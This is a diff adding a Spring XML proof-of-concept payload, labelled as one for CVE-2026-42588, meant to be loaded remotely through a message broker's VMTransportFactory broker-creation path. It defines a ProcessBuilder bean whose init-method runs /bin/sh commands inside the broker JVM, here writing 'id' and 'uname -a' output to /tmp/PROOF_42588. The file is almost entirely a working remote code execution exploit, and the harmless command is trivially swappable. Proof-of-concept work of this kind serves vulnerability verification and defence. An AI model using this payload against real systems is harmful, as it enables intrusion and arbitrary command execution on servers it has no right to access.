@@ -1,0 +1,17 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!-- CVE-2026-42588 PoC payload: remote Spring XML loaded by ResourceXmlApplicationContext
+     via VMTransportFactory broker-creation. Eagerly instantiates a ProcessBuilder
+     singleton and calls start() as its init-method -> command execution in broker JVM. -->
+<beans xmlns="http://www.springframework.org/schema/beans"
+       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+       xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
+  <bean id="pwn" class="java.lang.ProcessBuilder" init-method="start">
+    <constructor-arg>
+      <list>
+        <value>/bin/sh</value>
+        <value>-c</value>
+        <value>id &gt; /tmp/PROOF_42588 2&gt;&amp;1; uname -a &gt;&gt; /tmp/PROOF_42588</value>
+      </list>
+    </constructor-arg>
+  </bean>
+</beans>
